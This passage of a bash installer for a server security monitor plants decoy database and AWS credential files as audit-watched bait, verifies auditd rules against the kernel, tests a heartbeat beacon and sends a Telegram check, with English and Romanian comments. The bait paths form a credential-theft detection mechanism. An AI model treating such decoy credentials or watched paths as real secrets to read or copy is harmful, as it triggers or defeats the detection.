# deploy/audit/sentinel.rules for the kernel-side reasoning this relies on.
#
# Which size it checks against, in order:
#
#   1. The size recorded in $CANARY_STATE_PATH when THIS installer last
#      planted this path — authoritative, because it is what was actually
#      written here.
#   2. If there is no record — state file missing, or never seen this path —
#      the CANONICAL size: the length `_canary_content "$path"` would produce
#      today, computed by running it and measuring the result, never by
#      opening $path. This closes a gap the record alone leaves open:
#      MEASURED on production, both baits are already planted by an OLDER
#      installer and already armed in the kernel — 2 sentinel_bait rules,
#      32/32 loaded — and neither has ever been recorded, because
#      $CANARY_STATE_PATH did not exist when they were planted. Falling back
#      to "no record ⇒ foreign" on the very first deploy of this mechanism
#      would warn on both, on every host already running this installer, and
#      drop their `-w` lines from what reaches the kernel — disarming a real
#      detection on the exact deploy meant to quiet a false one, while
#      install_audit_rules's own count keeps reporting every SENT rule as
#      loaded, because the dropped line was never sent to begin with. The
#      canonical content has not changed, so an untouched old bait matches it
#      immediately, with nothing to read and nothing to migrate.
#
# A match by either path adopts the size into $CANARY_STATE_PATH, so every
# deploy after this one goes through (1) and never needs (2) again for a
# bait that has not changed since.
#
# KNOWN WEAKNESS, accepted on purpose: classifying by size, not content, means
# a real file that happens to land at this path with EXACTLY the same byte
# count as the canonical bait would be adopted as "ours" and armed under
# sentinel_bait over real content — the old content-marker check did not have
# this hole. Judged acceptable because the canonical content is a specific,
# multi-line fake-credentials block, not a round or common byte count, so a
# coincidental match is unlikely, and the alternative — depending on the
# record alone — is not a narrow edge case: it is a guaranteed, silent-to-
# selfcheck disarm of an already-armed rule on every host that has this
# installer's baits today, the first time this file ships.
#
# Writes to $1, one per line, the path of any bait that already existed and
# matched NEITHER a recorded NOR a canonical size: either something else
# lives there, or `_canary_content` no longer knows this path at all — and
# either way the caller must drop the sentinel_bait watch for that one path
# rather than let the kernel watch unrecognised content under a decoy's name.
install_canary_baits() {
    local foreign_file="$1" path dir content size recorded
    : > "$foreign_file"

    # What was planted last time: path -> size in bytes. Read once, up front,
    # so the loop below never has to touch a bait's content to decide.
    local -A planted_size=()
    if [[ -f "$CANARY_STATE_PATH" ]]; then
        local rec_path rec_size
        while read -r rec_path rec_size; do
            [[ -n "$rec_path" ]] && planted_size["$rec_path"]="$rec_size"
        done < "$CANARY_STATE_PATH"
    fi

    local -a state_lines=()
    for path in "$CANARY_PGPASS_PATH" "$CANARY_AWS_CREDS_PATH"; do
        if [[ -e "$path" ]]; then
            size="$(stat -c %s -- "$path" 2>/dev/null || true)"
            recorded="${planted_size[$path]:-}"
            if [[ -z "$recorded" ]] && content="$(_canary_content "$path")"; then
                # Measures what THIS content would occupy on disk, exactly as
                # the planting branch below writes it (`printf '%s\n'`, one
                # trailing newline) -- never opens $path itself.
                recorded="$(printf '%s\n' "$content" | wc -c | tr -d '[:space:]')"
            fi
            if [[ -n "$size" && -n "$recorded" && "$size" == "$recorded" ]]; then
                info "bait already at ${path}, left untouched (a repeat deploy never rewrites one, edited or not)"
                state_lines+=("$path $size")
            else
                warn "bait NOT planted at ${path}: its size (${size:-unknown} bytes) matches \
neither the recorded plant in ${CANARY_STATE_PATH} nor the canonical bait content. The \
sentinel_bait watch for this path is left OUT of the kernel rather than monitor unrecognised \
content under a decoy's name -- if this really is the bait, move it aside and re-run this step \
so it gets replanted and recorded; if it's something else, move it."
                printf '%s\n' "$path" >> "$foreign_file"
            fi
            continue
        fi
        dir="$(dirname "$path")"
        if [[ ! -d "$dir" ]]; then
            mkdir -p "$dir"
            chmod 0700 "$dir"
        fi
        if ! content="$(_canary_content "$path")"; then
            warn "no bait content defined for ${path}, skipping"
            printf '%s\n' "$path" >> "$foreign_file"
            continue
        fi
        printf '%s\n' "$content" > "$path"
        chmod 0600 "$path"
        chown root:root "$path" 2>/dev/null || true
        size="$(stat -c %s -- "$path" 2>/dev/null || true)"
        [[ -n "$size" ]] && state_lines+=("$path $size")
        # `info`, not `ok`: planting the file is intent, not the effect this
        # repository cares about. Whether the bait is actually ARMED is decided
        # by the very same kernel count/verdict below that covers every other
        # rule in this file — a second, separate green line here would be a
        # claim of success this function cannot back on its own.
        info "bait planted at ${path} (armed below, by the sentinel_bait audit rule)"
    done

    # Written LAST, and only over what this run actually confirmed — matched
    # (by record or by canonical size) or freshly planted. A path that fell
    # through to the foreign branch above is deliberately left OUT, so it
    # stays unrecorded, and therefore foreign, on the next deploy too, until
    # whatever is really there gets resolved.
    if (( ${#state_lines[@]} )); then
        dir="$(dirname "$CANARY_STATE_PATH")"
        [[ -d "$dir" ]] || mkdir -p "$dir"
        ( umask 077; printf '%s\n' "${state_lines[@]}" > "${CANARY_STATE_PATH}.tmp" )
        chown root:root "${CANARY_STATE_PATH}.tmp" 2>/dev/null || true
        chmod 0600 "${CANARY_STATE_PATH}.tmp"
        mv "${CANARY_STATE_PATH}.tmp" "$CANARY_STATE_PATH"
    fi
}

install_audit_rules() {
    local src="${SCRIPT_DIR}/audit/sentinel.rules"
    [[ -f "$src" ]] || return 0

    # Baits before rules, always -- see install_canary_baits for why order
    # here is not cosmetic.
    local foreign_baits
    foreign_baits="$(mktemp)"
    install_canary_baits "$foreign_baits"

    # What reaches /etc/audit/rules.d is what this host can load, not the whole
    # shipped file — see audit_rules_for_this_host for what was measured and why.
    # It has to be the FILE that is filtered, not just the load: augenrules also
    # runs at boot, from the same directory, with nobody watching.
    local staged line
    local -a dropped=()
    staged="$(mktemp)"
    while IFS= read -r line; do
        [[ -n "$line" ]] && dropped+=("$line")
    done < <(audit_rules_for_this_host "$staged" < "$src")

    # A bait path occupied by something foreign (see install_canary_baits): its
    # `-w` line is stripped here, after the general filter above and before the
    # file reaches the kernel, so auditctl never ends up watching whatever real
    # content actually lives there under the sentinel_bait key.
    if [[ -s "$foreign_baits" ]]; then
        local -a foreign_paths=()
        while IFS= read -r path || [[ -n "$path" ]]; do
            [[ -n "$path" ]] && foreign_paths+=("$path")
        done < "$foreign_baits"
        local filtered out_line skip fp
        filtered="$(mktemp)"
        while IFS= read -r out_line || [[ -n "$out_line" ]]; do
            skip=0
            for fp in "${foreign_paths[@]}"; do
                if [[ "$out_line" == "-w $fp "* ]]; then
                    skip=1
                    break
                fi
            done
            (( skip )) || printf '%s\n' "$out_line" >> "$filtered"
        done < "$staged"
        mv "$filtered" "$staged"
    fi
    rm -f "$foreign_baits"

    install -D -m 0640 "$staged" "$AUDITD_RULES_DEST"
    rm -f "$staged"

    # Named, not silent — but not a red line on every deploy either. A `never`
    # suppression for a directory that does not exist suppresses nothing, so
    # leaving it out changes no behaviour and this is an info. Anything else
    # dropped IS a rule this host is missing, and joins the verdict below.
    local -a dropped_never=() dropped_other=()
    for line in ${dropped[@]+"${dropped[@]}"}; do
        if [[ "$line" == *never,exit* ]]; then
            dropped_never+=("$line")
        else
            dropped_other+=("$line")
        fi
    done
    if (( ${#dropped_never[@]} )); then
        info "auditd: ${#dropped_never[@]} suppression rule(s) left out of \
${AUDITD_RULES_DEST}, because their directory does not exist on this host. The kernel \
refuses '-F dir=' on a path that is not there, and auditctl -R stops at it, losing \
every rule after it:
    $(printf '%s\n    ' "${dropped_never[@]}")
    They suppress nothing here. If that software is installed later, re-run this \
step:  --force-step 37"
    fi

    if ! have auditctl || ! have augenrules; then
        warn "the audit rules are on disk at ${AUDITD_RULES_DEST} and \
NOTHING loaded them — this host has no auditctl/augenrules. Every host.* detection, \
plus auth.new_user and auth.new_ssh_key, has no source."
        return 0
    fi

    # NOT `2>/dev/null`. The kernel validates each rule on load and rejects the
    # ones it does not understand, one at a time, on stderr. Discarding that
    # output means a rejected rule looks exactly like a loaded one.
    local raw
    raw="$(augenrules --load 2>&1)" || true

    # But not everything in there is an error, and the whole lot was being shown
    # to the operator under the heading "augenrules failed". Measured on Ubuntu
    # 24.04.4: a second deploy prints "/usr/sbin/augenrules: No change" — the
    # generated audit.rules is byte-identical to the one already installed,
    # which is the ordinary outcome of deploying twice — and then loads it
    # anyway. auditctl additionally echoes a full status block for every -b /
    # --backlog_wait_time line it is fed. Reporting a wall of that as a failure
    # is how an operator learns to skip past the line where the real error is.
    #
    # The bare `No rules` line is the same kind of noise, and it cost an extra
    # round to spot because until 27 August 2026 a real error was always printed
    # beside it. MEASURED on the VM that day: `auditctl -D` prints `No rules` on
    # stdout EVERY time, including the run where it had just deleted 29 rules,
    # and `augenrules --load` runs `auditctl -D` before `auditctl -R`. Left in,
    # it turns a perfectly healthy host into "augenrules did not load the whole
    # file: No rules" on every deploy. Nothing is lost by dropping it: the
    # question it looks like it answers is answered properly a few lines below,
    # by counting every rule against `auditctl -l`.
    local errs
    errs="$(printf '%s\n' "$raw" \
        | grep -vE '^[^:]*augenrules: (No change|No rules)$' \
        | grep -vE '^No rules$' \
        | grep -vE '^(enabled|failure|pid|rate_limit|backlog_limit|lost|backlog|backlog_wait_time|backlog_wait_time_actual|loginuid_immutable) [0-9]+$' \
        | grep -vE '^[[:space:]]*$' || true)"

    # And then count against the kernel, RULE by rule.
    #
    # Per key was not enough. A rejected rule that shares its key with a loaded
    # one is invisible that way, and on this host that is not hypothetical:
    # `auditctl -R` stops at the first rule it cannot add, so
    # `-a never,exit -F dir=/var/lib/docker` failing on a host without docker
    # takes the two suppression rules after it down with it — silently, because
    # suppression rules carry no key at all.
    local -A want_sig=() have_sig=()
    local n sig
    while read -r n sig; do
        [[ -n "$sig" ]] && want_sig["$sig"]="$n"
    # The INSTALLED file, not the shipped one: that is what was offered to the
    # kernel, and counting the shipped file here would report a rule this host
    # deliberately does not have as one the kernel refused.
    done < <(audit_rule_signatures < "$AUDITD_RULES_DEST" | sort | uniq -c)
    while read -r n sig; do
        [[ -n "$sig" ]] && have_sig["$sig"]="$n"
    done < <(auditctl -l 2>/dev/null | audit_rule_signatures | sort | uniq -c || true)

    local total=0 present=0 got_n missing=() unchecked=()
    for sig in "${!want_sig[@]}"; do
        case "$sig" in
            "option "*)    continue ;;   # not listed by auditctl -l; checked below
            "unchecked "*) unchecked+=("${sig#unchecked }"); continue ;;
        esac
        total=$(( total + want_sig["$sig"] ))
        got_n="${have_sig[$sig]:-0}"
        if (( got_n >= want_sig["$sig"] )); then
            present=$(( present + want_sig["$sig"] ))
        else
            present=$(( present + got_n ))
            missing+=("${sig}: ${got_n} of ${want_sig[$sig]} in the kernel")
        fi
    done

    # -b and --backlog_wait_time never appear in `auditctl -l` — they are
    # settings, and `auditctl -s` is where the kernel says what it accepted.
    # Passing over them silently would leave the one number that decides whether
    # records are DROPPED unverified, and a dropped record looks exactly like a
    # command that was never run.
    local status kernel_key kernel_val optname optval
    status="$(auditctl -s 2>/dev/null || true)"
    for sig in "${!want_sig[@]}"; do
        [[ "$sig" == "option "* ]] || continue
        read -r _ optname optval <<< "$sig"
        case "$optname" in
            -b)                  kernel_key=backlog_limit ;;
            --backlog_wait_time) kernel_key=backlog_wait_time ;;
            *)                   unchecked+=("$sig"); continue ;;
        esac
        kernel_val="$(awk -v k="$kernel_key" '$1 == k { print $2; exit }' <<< "$status")"
        [[ "$kernel_val" == "$optval" ]] || \
            missing+=("${kernel_key} is ${kernel_val:-unreadable} in the kernel, not ${optval}")
    done

    # `auditctl -l` reads the KERNEL, and kernel rules outlive the daemon that
    # asked for them. "confirmed loaded" was printed on a host where auditd was
    # dead: the rules were in place, nothing was writing them to audit.log, and
    # every host.* detection was reading an empty file.
    local audit_pid audit_enabled dead=()
    audit_pid="$(awk '$1 == "pid" { print $2; exit }' <<< "$status")"
    audit_enabled="$(awk '$1 == "enabled" { print $2; exit }' <<< "$status")"
    [[ "$audit_enabled" == "1" || "$audit_enabled" == "2" ]] || \
        dead+=("kernel auditing is '${audit_enabled:-unreadable}', not enabled")
    [[ "$audit_pid" =~ ^[1-9][0-9]*$ ]] || \
        dead+=("no auditd daemon is running (pid '${audit_pid:-unreadable}'), so nothing \
reaches ${AUDITD_LOG_PATH} however many rules the kernel holds")

    # ONE verdict. The old block printed "augenrules failed" and then
    # "rules installed and confirmed loaded" two lines apart, and an operator
    # reading two opposite statements believes the second one.
    local problems=("${missing[@]}" "${dead[@]}")
    for line in ${dropped_other[@]+"${dropped_other[@]}"}; do
        problems+=("NOT installed, the path it names does not exist here: ${line}")
    done
    [[ -n "$errs" ]] && problems+=("augenrules did not load the whole file:
${errs}")
    (( ${#unchecked[@]} )) && problems+=("these lines could not be verified at all: ${unchecked[*]}")

    if (( ${#problems[@]} )); then
        warn "auditd: ${present}/${total} of Sentinel's rules are in the kernel, and:
    $(printf '%s\n    ' "${problems[@]}")
    Inspect with: auditctl -l ; auditctl -s ; augenrules --load"
    else
        ok "auditd: all ${total} rules from sentinel.rules counted one by one in the \
kernel, and auditd (pid ${audit_pid}) is collecting"
    fi
}

step_auxiliary() {
    install_audit_rules
    if [[ -f "${SCRIPT_DIR}/fail2ban/sentinel-web.conf" ]] && have fail2ban-client; then
        install -D -m 0644 "${SCRIPT_DIR}/fail2ban/sentinel-web.conf" \
            /etc/fail2ban/jail.d/sentinel-web.conf
        systemctl reload fail2ban 2>/dev/null || true
        ok "fail2ban jail installed for the dashboard login"
    fi

    # The ingest daemon (P3) runs as the unprivileged `sentinel` user and needs to
    # read the nginx access logs, which ship 640 nginx:root — unreadable to it. A
    # per-user ACL grants exactly read, and a default ACL on the directory keeps
    # it working across logrotate (the new file inherits the default). This is
    # least-privilege: read on the logs, nothing else. It runs only if nginx and
    # setfacl are present.
    if [[ -d /var/log/nginx ]]; then
        if ! have setfacl; then
            pkg_install acl >/dev/null 2>&1 || warn "acl (setfacl) unavailable; ingest may not read nginx logs"
        fi
        if have setfacl; then
            setfacl -m u:"${SENTINEL_USER}":rx /var/log/nginx 2>/dev/null || true
            setfacl -d -m u:"${SENTINEL_USER}":rx /var/log/nginx 2>/dev/null || true
            setfacl -R -m u:"${SENTINEL_USER}":r /var/log/nginx/*.log 2>/dev/null || true
            ok "granted ${SENTINEL_USER} read access to the nginx logs (ACL)"
        fi
    fi
}

# --- 37 -------------------------------------------------------------------
# Beaconul BATE? — nu „e activ", ci contorul lui a avansat.
#
# `sentinel-beacon.service` poate fi `active` și complet mut: fără identitate de
# instalare expeditorul nu trimite nimic, iar procesul rămâne în picioare la
# aceeași cadență, dinadins (sentinel/report/beacon.py). Deci `is-active` e
# exact tiparul din CLAUDE.md — cod de ieșire în loc de efect — cu o singură
# diferență: aici efectul e vizibil.
#
# `beacon:seq` din `collector_cursors` se incrementează chiar înainte de POST,
# deci avansează și când martorul e căzut sau refuză semnalul. Asta e proprietatea
# potrivită: verificăm că EXPEDITORUL produce semnale, nu că martorul le acceptă
# — al doilea depinde de o cheie pusă manual în alt panou și n-are ce căuta
# într-o poartă de instalare.
smoke_beacon_is_beating() {
    local waited=0 limit before after

    if ! systemctl is-active --quiet sentinel-beacon.service; then
        # Ce s-a OBSERVAT, nu de ce. Cauza obișnuită e că martorul extern nu e
        # configurat, dar starea asta se atinge și cu el configurat perfect: o
        # identitate coruptă face `ensure_instance_id` să refuze rescrierea și
        # `start_beacon_unit` să refuze repornirea, iar unitatea rămâne activată
        # și nepornită. O propoziție liniștitoare despre o cauză pe care
        # verificarea nu s-a uitat la ea e chiar tiparul din CLAUDE.md.
        info "sentinel-beacon nu rulează — nimic de probat"
        return 0
    fi

    # Fereastra se derivă din cadență, nu e o constantă. `beacon.interval_s` nu
    # are limită superioară în `_validate`, deci un interval de 120 s ar face
    # verificarea asta să se plângă la FIECARE instalare despre un beacon perfect
    # sănătos — iar un avertisment care apare mereu e unul pe care nimeni nu-l
    # mai citește. Martorul își scalează la fel răbdarea (`allowance` din
    # aggregator/lib/verify.ts), doar cu alt factor.
    limit="$(( 2 * $(beacon_interval_s) ))"
    (( limit < 90 )) && limit=90

    before="$(beacon_seq)"
    while (( waited < limit )); do
        sleep 5; waited=$((waited + 5))
        after="$(beacon_seq)"
        # `-n` nu e prisos: `beacon_seq` întoarce ȘIR GOL și când interogarea
        # eșuează — postgres repornit, limită de conexiuni atinsă, socket căzut —
        # fiindcă stderr-ul ei merge la /dev/null. Fără el, primul eșec de sondă
        # ar fi „diferit de valoarea dinainte", iar instalarea ar tipări o linie
        # verde de succes cu dovada goală în ea: „beacon:seq 7098 → , în 5s".
        # Adică exact minciuna pe care funcția asta există ca s-o oprească, un
        # strat mai jos.
        if [[ -n "$after" && "$after" != "$before" ]]; then
            ok "beaconul bate (beacon:seq ${before:-–} → ${after}, în ${waited}s)"
            return 0
        fi
    done

    warn "sentinel-beacon e ACTIV dar nu a trimis niciun semnal în ${waited}s"
    warn "(beacon:seq a rămas la '${before:-inexistent}'). Un proces viu care nu"
    warn "trimite e tăcere pentru martorul extern, iar el o va raporta ca alarmă"
    warn "critică. Cauza cea mai probabilă e identitatea instalării:"
    warn "    journalctl -u sentinel-beacon -n 30"
    warn "    ls -l ${SENTINEL_CONFIG_DIR}/instance_id"
}

# Cadența beaconului din configurație, sau 60 dacă nu se poate afla.
#
# Valoarea implicită e cea din `BeaconConfig`, nu una inventată aici, iar o
# configurație pe care n-o putem citi duce la fereastra dinainte — nu la una
# infinită. „Nu știu" nu are voie să însemne „așteaptă oricât".
#
# `tr -dc '0-9'` a fost înlocuit fiindcă ștergea punctul în loc să-l înțeleagă:
# `60.0` ieșea `600` (fereastră de 20 de minute în loc de 2), iar `0.5` ieșea
# `05`. Cât timp `_coerce` din sentinel/config.py lăsa floatul neatins, un
# `interval_s: 60.0` era vizibil greșit peste tot; de când îl normalizează la
# `60`, funcția asta a rămas SINGURUL cititor care mai înțelege altceva decât
# agentul — adică o valoare pe care instalatorul și serviciul o citesc diferit,
# fără ca ceva să spună asta.
#
# Ce nu se ghicește se refuză, și atunci se folosește valoarea implicită: `0.5`
# nu are conversie onestă la un întreg (`_coerce` îl respinge cu ConfigError), și
# nici `abc`. „Nu știu" înseamnă fereastra implicită, nu o cifră inventată din
# caractere rămase.
beacon_interval_s() {
    local raw value default=60
    # `|| true` nu e prisos: `awk` iese cu 2 pe un fișier care nu există, iar
    # `set -e` oprește instalarea pe o atribuire cu substituție de comandă care
    # eșuează. O configurație pe care n-o putem citi trebuie să ducă la fereastra
    # implicită, nu la o instalare moartă în funcția care calculează un timeout.
    raw="$(awk '
        /^[^[:space:]#]/ { inb = ($0 ~ /^beacon:/) }
        inb && $1 == "interval_s:" { print $2; exit }
    ' "${SENTINEL_CONFIG_DIR}/sentinel.yaml" 2>/dev/null || true)"

    if [[ -z "$raw" ]]; then
        # Cheia lipsește, secțiunea lipsește, sau fișierul lipsește. Valoarea
        # implicită E răspunsul aici — la fel ca în `BeaconConfig` — deci nu se
        # avertizează. Un avertisment la fiecare instalare care nu setează câmpul
        # e chiar felul în care operatorul învață să treacă peste avertismente.
        printf '%s' "$default"
        return 0
    fi

    # Ghilimelele NU se scot, dinadins. `_coerce` din sentinel/config.py nu
    # convertește un `str` la `int`, deci `interval_s: "90"` ajunge la
    # `asyncio.sleep('90')` și omoară beaconul la prima rundă. Un instalator care
    # ar citi 90 de acolo ar raporta o fereastră pentru un serviciu care nu
    # pornește; refuzul de mai jos descrie situația, tolerarea ar ascunde-o.
    value="$raw"

    if [[ "$value" =~ ^[1-9][0-9]*$ ]]; then
        : # zecimal, forma obișnuită
    elif [[ "$value" =~ ^0[0-7]+$ ]]; then
        # YAML 1.1 citește un zero în față ca OCTAL, iar PyYAML face exact asta:
        # `060` ajunge 48 în `cfg.beacon.interval_s`, deci beaconul doarme 48 de
        # secunde. Fereastra de aici trebuie să fie a lui 48, nu a lui 60 —
        # altfel instalatorul și agentul citesc din nou numere diferite din
        # același rând, care e chiar lucrul reparat aici.
        value="$(( 8#${value#0} ))"
    elif [[ "$value" =~ ^([1-9][0-9]*)\.0+$ ]]; then
        # Exact ce face `_coerce`: un float întreg devine întregul lui.
        value="${BASH_REMATCH[1]}"
    else
        value=""
    fi

    if [[ -z "$value" || "$value" -le 0 ]]; then
        # `08` e cazul care a cerut ramura asta. Nu e nici zecimal (zero în
        # față), nici octal (cifra 8), deci PyYAML îl lasă ȘIR — agentul e
        # oricum stricat cu el, doar altfel. Ce nu e acceptabil e felul în care
        # se afla: `08` trecea de o verificare „numai cifre", ajungea în
        # `$(( 2 * 08 ))`, iar sub `set -euo pipefail` instalarea murea cu
        # „value too great for base (error token is "08")" și apoi cu
        # „limit: unbound variable". Operatorul primea un mesaj despre bash în
        # locul numelui câmpului, după o schimbare întreagă făcută ca să
        # primească numele câmpului.
        warn "beacon.interval_s din ${SENTINEL_CONFIG_DIR}/sentinel.yaml nu e un" \
             "număr întreg pozitiv de secunde (am citit: ${raw})."
        warn "Folosesc ${default}s pentru fereastra probei de fum, dar verifică rândul" \
             "acela: agentul nu obține nici el un număr din el, deci beaconul poate" \
             "să nu pornească deloc."
        value="$default"
    fi
    printf '%s' "$value"
}

beacon_seq() {
    sudo -u postgres psql -d sentinel -tAc \
        "SELECT cursor FROM collector_cursors WHERE name = 'beacon:seq'" 2>/dev/null \
        | tr -d '[:space:]'
}

step_smoke_test() {
    "${SENTINEL_PREFIX}/bin/sentinel" config-check -v || warn "config-check reported problems"

    smoke_beacon_is_beating

    # Loopback first: proves the app and nginx agree, independently of DNS, the
    # certificate and the provider firewall. Separating the two checks means a
    # failure says *which* of those is wrong.
    if curl -sk --max-time 10 -o /dev/null -w '%{http_code}' \
        "https://127.0.0.1:${PUBLIC_PORT}/healthz" | grep -qE '^(200|401|302|503)$'; then
        ok "nginx is serving the dashboard on :${PUBLIC_PORT}"
    else
        warn "nothing answered on https://127.0.0.1:${PUBLIC_PORT}/healthz"
    fi

    if [[ -n "$DOMAIN" ]]; then
        if curl -sk --max-time 10 -o /dev/null -w '%{http_code}' \
            "https://${DOMAIN}:${PUBLIC_PORT}/healthz" | grep -qE '^(200|401|302)$'; then
            ok "dashboard reachable at https://${DOMAIN}:${PUBLIC_PORT}"
        else
            warn "https://${DOMAIN}:${PUBLIC_PORT}/healthz did not answer. If the \
loopback check above passed, then either the provider firewall is blocking \
:${PUBLIC_PORT} or DNS is not pointing here yet — Sentinel itself is fine."
        fi
    fi
}

# --- 38 -------------------------------------------------------------------
step_verify_nothing_broken() {
    # The check that matters most. Sentinel installing perfectly while stopping
    # something the server was already doing is a failed deployment, not a
    # partial success — and the operator would find out from their users.
    if ! assert_nothing_broken "after install"; then
        warn "rolling back automatically"
        "${SCRIPT_DIR}/rollback.sh" "$SNAPSHOT_DIR" --yes || true
        die "the deployment stopped a service that was running before it started. \
Rolled back. Compare ${STATE_MARKERS}/baseline-services.txt with the current state."
    fi
}

# --- 39 -------------------------------------------------------------------
# How long the test send may take before the installer stops waiting for it.
#
# The command bounds itself already: one request per allowed chat, ten seconds
# each. This is the outer bound, and it exists for the case the inner one does
# not cover — a command that does something other than what this step believes
# it does. That is not hypothetical: this step used to invoke a flag NOTHING
# defined, the CLI dropped unknown flags, and the line therefore started a
# second Telegram long-poller against the token the live unit was already
# using. It never returned, so neither branch below ever printed, and every
# deploy was killed by hand at step 39 — which skipped deploy.sh's cleanup of
# /tmp/sentinel-deploy-*, and that is how three copies of credentiale.txt sat
# world-readable on the host for nine days (measured; the hardening log that
# records it is kept off this public repository).
NOTIFY_TIMEOUT_S=60

step_notify() {
    # Receiving this message IS the end-to-end proof: config loaded, secrets
    # readable, network egress works, the bot token is valid, the chat id is
    # right. A green install log proves much less.
    #
    # So the verdict here is Telegram's answer, not this script's exit code:
    # `sentinel telegram --send-test` returns 0 only when the API handed back a
    # message_id for every allowed chat, 78 when telegram is not configured at
    # all, and non-zero with the reason printed when a send was tried and did
    # not land.
    #
    # Every substitution has a fallback, and that is not defensive habit: this
    # runs under `set -e`, where a bare `msg="$(hostname -f)"` aborts the
    # function the moment `hostname -f` fails — and it does fail, on exactly the
    # fresh VPS this installer targets, when no FQDN resolves yet. The step
    # would then print no verdict at all, which is the failure being repaired.
    local rc=0 msg version host
    version="$(cat "${SENTINEL_PREFIX}/VERSION" 2>/dev/null || echo unknown)"
    host="$(hostname -f 2>/dev/null || hostname 2>/dev/null || echo unknown)"
    msg="Sentinel ${version} instalat pe ${host}. Dashboard: https://${DOMAIN:-<fara domeniu>}"

    if ! have timeout; then
        # Refused rather than run unguarded. An installer that can hang forever
        # on its last step is the defect this step is being repaired for, and
        # "probably fine" is not a reason to reintroduce it.
        warn "coreutils' timeout(1) is missing, so this step cannot be bounded. \
Skipping the test send — the alert channel is UNPROVEN. Run it by hand: \
${SENTINEL_PREFIX}/bin/sentinel telegram --send-test"
        return 0
    fi

    # stderr is deliberately NOT discarded: when a send fails, Telegram's own
    # words ("chat not found", "Unauthorized") are the entire diagnostic, and
    # the previous version of this line sent them to /dev/null.
    timeout --kill-after=10s "${NOTIFY_TIMEOUT_S}s" \
        "${SENTINEL_PREFIX}/bin/sentinel" telegram --send-test --message "$msg" || rc=$?

    case "$rc" in
        0)
            ok "Telegram accepted the test message for every allowed chat — \
check that it arrived on your phone"
            ;;
        78)
            info "Telegram is not configured, so nothing was sent. Everything \
else is installed; alerts will go to the dashboard only."
            ;;
        124|137)
            # 124 = timeout sent TERM, 137 = it had to follow up with KILL.
            #
            # A warning, not a die. The host is fully installed by this point,
            # and stopping the run here would report the wrong thing to the
            # operator AND to scripts/deploy.sh, which reads a failed install as
            # "nothing works" and leaves its /tmp tree in place. What is true is
            # narrower and is said as such: the alert channel is unproven.
            warn "the Telegram test did not return within ${NOTIFY_TIMEOUT_S}s and was \
killed. Sentinel is installed; the alert channel is UNPROVEN. Check it by hand: \
${SENTINEL_PREFIX}/bin/sentinel telegram --send-test"
            ;;
        *)
            warn "the Telegram test failed (exit ${rc}) — the reason is printed \
above, from Telegram. Sentinel is installed, but it cannot reach you yet."
            ;;
    esac
}

# --- 41 -------------------------------------------------------------------
# Persistent, bounded journald storage.
#
# The fault this repairs is data loss, not a misconfiguration. RHEL and its
# derivatives ship `Storage=auto` with no /var/log/journal, so the journal lives
# in /run and is destroyed at every boot; Debian and Ubuntu create the directory
# from the package, which is why the Ubuntu host never showed the problem and
# why nothing in this repository had ever looked. Production rebooted on
# 10 September 2026, its first boot in over five days, and every `Failed
# password`, `Accepted publickey` and `Invalid user` line from 6-9 September
# went with it: new seqnum-id, new boot-id, `journalctl --disk-usage` from
# 149.1 M to 16.0 M, retained window back to zero. Sentinel's primary
# authentication evidence lived only there.
#
# WHY THIS IS IN ALWAYS_STEPS
#
# A marker answers "was this done once". That is the wrong question here. The
# right one is "is this host persistent NOW", and the answer changes without
# anyone re-running the installer: a `Storage=volatile` dropped in by a
# configuration manager, a /var/log/journal removed by somebody freeing disk, a
# host installed before this step existed. `journal_storage_state` asks that
# question of the running daemon on every deploy, and the step is a genuine
# no-op — no restart, no flush, no write — on a host that is already right. The
# cost there is one `journalctl --header` and one `journalctl -b`.
#
# The second reason is the rule ALWAYS_STEPS states for itself: the drop-in
# below carries repo content — the bounds. Marker-gated, a host would keep
# whatever numbers it was installed with and never a revision of them.
#
# WHY 41, AND WHY IT RUNS BEFORE 40 DESPITE THE NUMBER
#
# Step numbers are documentation: `--force-step N` appears in docs/OPERARE.md,
# in docs/DEPANARE.md and in the operator's command history, so inserting a
# number renumbers every step after it and invalidates all of them — the same
# reason `ensure_instance_id` is not a step. `run_step` compares `--from-step`
# and `--force-step` by the NUMBER passed in, never by where the call sits in
# `main`, so the two are free to disagree — and they do, on purpose, below.
#
# A first version called this step AFTER 40 (`notify`), in numeric order. That
# put a `die` in this step behind "Sentinel installed" already having gone to
# Telegram — the FATAL was the truth and the Telegram message was not, and an
# operator who saw both would have had to know to distrust the one that looked
# like success. Since this step can legitimately die (below), and it is in
# ALWAYS_STEPS so it dies again on the SAME host on every deploy until the
# cause is fixed, that is not a one-off wrinkle — it is the message this step
# will send on every failing run until someone reads the FATAL instead of the
# "installed" that preceded it. The call below is moved ahead of 40's, so the
# order actually executed is 39, 41, 40, 42: whatever this step has to say
# about the evidence channel is said BEFORE Telegram claims the install
# finished, not after.
#
# WHETHER IT SHOULD BE ABLE TO `die` AT ALL
#
# It still can, and that is a deliberate choice, not the leftover of the
# ordering bug above. `journal_verify_persistent` dies only when the daemon
# was just restarted and flushed FOR THIS and still is not writing where it
# was asked to — the exact shape of "reload nginx returned 0 while the master
# rejected the config": every exit code along the way was 0, and the only
# thing that tells the truth is asking the daemon what it is actually doing.
# A `warn` there would make this step's own SUCCESS output ("jurnalul
# supraviețuiește acum repornirii") conditional on nobody reading past it, and
# tests/security/test_installer_journal_storage.py already holds that
# specific line to `returncode != 0` for exactly that reason (§4 in the
# module docstring) — turning it into a warning would pass by not proving
# anything, the fault this repository keeps re-finding in its own tests.
#
# What `die` costs here is real and is NOT this step's to spend alone: `die`
# is `exit 1` on the whole `install.sh` process, so a host that never manages
# to become persistent — SELinux denying the label, `/var/log` on a
# read-only mount, a container without a real systemd-journald — fails this
# step on EVERY deploy for as long as that is true, and with it every step
# after it in EXECUTION order, including 42 and whatever is added later —
# and, because of the reorder above, that now also includes 40 (`notify`):
# on such a chronically failing host the end-to-end proof that the Telegram
# channel works is never performed at all, not just delayed. That is a
# property of `run_step`/`die` shared by all ~42 steps, not something
# particular to 41, and changing it — e.g. letting `main` keep running past a
# failed step and report a non-zero exit only at the end — is a change to how
# EVERY step in this installer fails, decided once for all of them, not a
# per-step patch smuggled in here. That redesign is not made in this change.
JOURNAL_DIR="${JOURNAL_DIR:-/var/log/journal}"
JOURNAL_RUNTIME_DIR="${JOURNAL_RUNTIME_DIR:-/run/log/journal}"
JOURNALD_CONF="${JOURNALD_CONF:-/etc/systemd/journald.conf}"
JOURNALD_CONF_DIR="${JOURNALD_CONF_DIR:-/etc/systemd/journald.conf.d}"
JOURNALD_DROPIN="${JOURNALD_DROPIN:-${JOURNALD_CONF_DIR}/10-sentinel.conf}"
